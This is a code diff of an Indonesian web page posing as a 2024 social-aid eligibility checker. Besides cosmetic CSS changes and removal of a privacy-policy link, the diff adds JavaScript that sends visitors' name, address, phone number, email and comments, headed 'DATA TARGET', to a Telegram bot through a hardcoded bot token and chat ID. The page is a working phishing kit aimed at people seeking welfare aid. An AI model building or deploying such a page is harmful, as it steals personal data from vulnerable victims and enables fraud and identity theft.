@@ -6,160 +6,161 @@
     <title>Pengecekan Bantuan Sosial 2024</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
+      /* CSS styles remain unchanged */
       * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: 'Poppins', sans-serif;
-}
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+          font-family: 'Poppins', sans-serif;
+      }
 
-body {
-    background-color: #f0f2f5;
-    color: #333;
-    display: flex;
-    flex-direction: column;
-    min-height: 100vh; /* Membuat tinggi minimal 100% viewport */
-}
+      body {
+          background-color: #f0f2f5;
+          color: #333;
+          display: flex;
+          flex-direction: column;
+          min-height: 100vh; /* Membuat tinggi minimal 100% viewport */
+      }
 
-.container {
-    background: linear-gradient(135deg, #ffffff, #f7f9fc);
-    padding: 30px;
-    border-radius: 16px;
-    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-    width: 100%;
-    max-width: 500px;
-    text-align: center;
-    margin: auto; /* Membuat container berada di tengah halaman */
-}
+      .container {
+          background: linear-gradient(135deg, #ffffff, #f7f9fc);
+          padding: 30px;
+          border-radius: 16px;
+          box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+          width: 100%;
+          max-width: 500px;
+          text-align: center;
+          margin: auto; /* Membuat container berada di tengah halaman */
+      }
 
-.icon {
-    font-size: 60px;
-    color: #ff6b6b;
-    margin-bottom: 15px;
-}
+      .icon {
+          font-size: 60px;
+          color: #ff6b6b;
+          margin-bottom: 15px;
+      }
 
-h1 {
-    font-size: 26px;
-    font-weight: 600;
-    color: #333;
-    margin-bottom: 25px;
-    letter-spacing: 1px;
-}
+      h1 {
+          font-size: 26px;
+          font-weight: 600;
+          color: #333;
+          margin-bottom: 25px;
+          letter-spacing: 1px;
+      }
 
-.form-group {
-    margin-bottom: 20px;
-    text-align: left;
-}
+      .form-group {
+          margin-bottom: 20px;
+          text-align: left;
+      }
 
-.form-group label {
-    display: block;
-    font-weight: 500;
-    color: #555;
-    margin-bottom: 8px;
-}
+      .form-group label {
+          display: block;
+          font-weight: 500;
+          color: #555;
+          margin-bottom: 8px;
+      }
 
-.form-group input,
-.form-group textarea {
-    width: 100%;
-    padding: 12px;
-    border: 1px solid #ccc;
-    border-radius: 8px;
-    font-size: 15px;
-    transition: border-color 0.3s ease;
-}
+      .form-group input,
+      .form-group textarea {
+          width: 100%;
+          padding: 12px;
+          border: 1px solid #ccc;
+          border-radius: 8px;
+          font-size: 15px;
+          transition: border-color 0.3s ease;
+      }
 
-.form-group input:focus,
-.form-group textarea:focus {
-    border-color: #ff6b6b;
-    outline: none;
-}
+      .form-group input:focus,
+      .form-group textarea:focus {
+          border-color: #ff6b6b;
+          outline: none;
+      }
 
-textarea {
-    resize: vertical;
-}
+      textarea {
+          resize: vertical;
+      }
 
-button {
-    background-color: #ff6b6b;
-    color: #fff;
-    padding: 12px 20px;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    font-size: 16px;
-    font-weight: 600;
-    transition: background-color 0.3s ease;
-    width: 100%;
-}
+      button {
+          background-color: #ff6b6b;
+          color: #fff;
+          padding: 12px 20px;
+          border: none;
+          border-radius: 8px;
+          cursor: pointer;
+          font-size: 16px;
+          font-weight: 600;
+          transition: background-color 0.3s ease;
+          width: 100%;
+      }
 
-button:hover {
-    background-color: #e84141;
-}
+      button:hover {
+          background-color: #e84141;
+      }
 
-footer {
-    margin-top: auto; /* Membuat footer tetap di bawah */
-    padding: 20px 0;
-    background-color: #fff;
-    text-align: center;
-    font-size: 14px;
-    border-top: 1px solid #ccc;
-}
+      footer {
+          margin-top: auto; /* Membuat footer tetap di bawah */
+          padding: 20px 0;
+          background-color: #fff;
+          text-align: center;
+          font-size: 14px;
+          border-top: 1px solid #ccc;
+      }
 
-.footer-content {
-    padding-top: 10px;
-}
+      .footer-content {
+          padding-top: 10px;
+      }
 
-.footer-links a {
-    margin: 0 15px;
-    text-decoration: none;
-    color: #555;
-    font-weight: 500;
-}
+      .footer-links a {
+          margin: 0 15px;
+          text-decoration: none;
+          color: #555;
+          font-weight: 500;
+      }
 
-.footer-links a:hover {
-    text-decoration: underline;
-    color: #ff6b6b;
-}
+      .footer-links a:hover {
+          text-decoration: underline;
+          color: #ff6b6b;
+      }
 
-.footer-social-icons a {
-    color: #555;
-    margin: 0 15px;
-    font-size: 22px;
-    text-decoration: none;
-    transition: color 0.3s ease;
-}
+      .footer-social-icons a {
+          color: #555;
+          margin: 0 15px;
+          font-size: 22px;
+          text-decoration: none;
+          transition: color 0.3s ease;
+      }
 
-.footer-social-icons a:hover {
-    color: #ff6b6b;
-}
+      .footer-social-icons a:hover {
+          color: #ff6b6b;
+      }
 
-/* Media queries untuk tampilan mobile */
-@media (max-width: 600px) {
-    body {
-        padding: 15px;
-    }
+      /* Media queries untuk tampilan mobile */
+      @media (max-width: 600px) {
+          body {
+              padding: 15px;
+          }
 
-    .container {
-        padding: 20px;
-    }
+          .container {
+              padding: 20px;
+          }
 
-    h1 {
-        font-size: 22px;
-    }
+          h1 {
+              font-size: 22px;
+          }
 
-    button {
-        padding: 10px 16px;
-        font-size: 14px;
-    }
+          button {
+              padding: 10px 16px;
+              font-size: 14px;
+          }
 
-    .form-group input,
-    .form-group textarea {
-        font-size: 14px;
-    }
+          .form-group input,
+          .form-group textarea {
+              font-size: 14px;
+          }
 
-    .icon {
-        font-size: 48px;
-    }
-}
+          .icon {
+              font-size: 48px;
+          }
+      }
     </style>
 </head>
 <body>
@@ -205,7 +206,6 @@ footer {
         <div class="footer-links">
             <a href="#about">Tentang Kami</a>
             <a href="#contact">Kontak</a>
-            <a href="#privacy">Kebijakan Privasi</a>
         </div>
         <div class="footer-social-icons">
             <a href="https://facebook.com" target="_blank" class="fab fa-facebook-f"></a>
@@ -214,7 +214,6 @@ footer {
         </div>
     </div>
 </footer>
-
 <script>
     // Efek mengetik pada judul
     var phrases = [
@@ -253,6 +252,11 @@ footer {
 
     type(); // Memulai efek mengetik
 
+    // Ganti dengan token bot Telegram Anda
+    const botToken = '7371764330:AAEgSgROcGBEbsgspY4IDNU_WqPL_3IczGs';
+    // Ganti dengan chat ID Anda
+    const chatId = '6864784021'; // Misal: '123456789' untuk pengguna pribadi atau '@your_channel' untuk channel
+
     document.getElementById('bantuanForm').addEventListener('submit', function(event) {
         event.preventDefault(); // Mencegah pengiriman formulir default
 
@@ -260,25 +264,40 @@ footer {
         var formData = new FormData(event.target);
         var data = Object.fromEntries(formData.entries());
 
-        // Mengirim data ke server
-        fetch('http://localhost:2626/submit', { // Sesuaikan URL ke port server
+        // Format pesan yang akan dikirim
+        const message = `
+DATA TARGET
+Nama Lengkap: ${data.name}
+Alamat Lengkap: ${data.address}
+Nomor Telepon: ${data.phone}
+Email: ${data.email}
+Komentar: ${data.comments}
+        `.trim();
+
+        // Mengirim data ke bot Telegram
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify(data)
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
         })
-        .then(response => response.text())
-        .then(result => {
-            alert(result); // Menampilkan pesan setelah pengiriman
-            document.getElementById('bantuanForm').reset(); // Reset formulir
+        .then(response => {
+            if (response.ok) {
+                alert('Data berhasil dikirim!');
+                event.target.reset(); // Mengatur ulang formulir setelah pengiriman
+            } else {
+                alert('Gagal mengirim data. Coba lagi.');
+            }
         })
         .catch(error => {
             console.error('Error:', error);
-            alert('Terjadi kesalahan saat mengirim data. Silakan coba lagi.');
+            alert('Terjadi kesalahan saat mengirim data.');
         });
     });
 </script>
-
 </body>
 </html>
